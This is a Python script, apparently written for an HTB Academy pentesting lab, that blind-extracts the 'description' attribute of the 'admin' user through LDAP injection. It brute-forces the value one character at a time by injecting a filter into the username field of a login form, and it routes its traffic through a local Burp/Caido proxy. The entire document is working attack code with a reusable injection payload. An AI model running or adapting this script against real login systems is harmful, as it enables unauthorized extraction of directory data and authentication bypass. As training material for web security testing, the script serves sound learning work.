# I created this script while doing HTB Academy Senior Web Pentester path to exfiltrate the "description" of the "admin" user via ldap injection. 
# It proxies to http://127.0.0.1:8080 for troubleshooting with Caido/Burp 
import requests
import string

# Define the target URL and necessary headers
url = "http://94.237.53.20:41981/index.php"  # Replace with the actual URL
headers = {
    "Content-Type": "application/x-www-form-urlencoded",
}

# Define the username and known prefix of the password or attribute (if any)
username = "admin"
password = "invalid)"
target_attribute = "description"

# Define the possible characters to brute-force (alphanumeric and special characters)
characters = string.ascii_letters + string.digits + string.punctuation + " "

# Set up the proxy to route traffic through Burp Suite or another proxy
proxies = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080",
}

# Function to test if a particular substring exists
def test_attribute(substring):
    payload = f"username={username})(|({target_attribute}={substring}*&password={password}"
    print(f"[*] Testing payload: {payload}")
    response = requests.post(url, headers=headers, data=payload, proxies=proxies, verify=False, allow_redirects=False)
    print(f"[+] Response received: {response.status_code} - Checking for success indicator...")
    success = "Login successful" in response.text  # Modify according to the success condition in response
    print(f"[+] Success: {success}")
    return success

# Function to exfiltrate the attribute character by character
def exfiltrate_attribute():
    exfiltrated_value = ""
    iteration = 1
    while True:
        found = False
        print(f"[*] Starting iteration {iteration}: Current exfiltrated value: '{exfiltrated_value}'")
        for char in characters:
            test_value = exfiltrated_value + char
            print(f"[*] Testing character: '{char}' -> Current test value: '{test_value}'")
            if test_attribute(test_value):
                exfiltrated_value += char
                print(f"[+] Found character '{char}': Exfiltrated value so far: '{exfiltrated_value}'")
                found = True
                break
        if not found:
            print(f"[!] No more characters found. Exfiltration complete.")
            print(f"[+] Finished exfiltrating: {exfiltrated_value}")
            break
        iteration += 1

    return exfiltrated_value

# Start the exfiltration process
if __name__ == "__main__":
    print("[*] Starting attribute exfiltration process...")
    description_value = exfiltrate_attribute()
    print(f"[+] Exfiltrated {target_attribute}: {description_value}")
